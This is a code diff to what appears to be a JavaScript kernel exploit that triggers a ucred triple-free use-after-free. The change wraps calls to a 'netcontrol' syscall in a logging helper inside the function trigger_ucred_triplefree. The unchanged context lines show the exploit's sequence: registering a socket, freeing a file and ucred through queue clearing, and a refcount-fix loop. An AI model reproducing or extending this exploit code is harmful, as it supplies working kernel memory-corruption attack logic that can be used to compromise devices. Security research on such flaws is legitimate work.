@@ -1422,6 +1422,13 @@ function remove_uaf_file() {
     }
   }
 }
+function nc_call(cmd, buf, len) {
+  var ret = netcontrol(BigInt_Error, cmd, buf, len);
+  log("[NETCONTROL] cmd=" + hex(cmd) +
+      " len=" + len +
+      " ret=" + ret);
+  return ret;
+}
 var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 48;
 var TRIPLEFREE_REFCOUNT_MAX_WAIT = 6000;
 
@@ -1439,7 +1446,8 @@ function trigger_ucred_triplefree() {
     // 1) dummy socket → register in netcontrol
     var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
     write32(nc_set_buf, Number(dummy_socket.and(0xFFFFFFFF)));
-    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
+    nc_call(NET_CONTROL_NETEVENT_SET_QUEUE, nc_set_buf, 8);
+
     close(new BigInt(dummy_socket));
 
     // 2) allocate new ucred
@@ -1453,8 +1461,7 @@ function trigger_ucred_triplefree() {
 
     // 5) unregister → free file + ucred
     write32(nc_clear_buf, uaf_socket);
-    netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
-
+    nc_call(NET_CONTROL_NETEVENT_CLEAR_QUEUE, nc_clear_buf, 8);
     // 6) refcount fix loop
     for (var i = 0; i < TRIPLEFREE_REFCOUNT_FIX_LOOPS; i++) {
       trigger_iov_recvmsg();
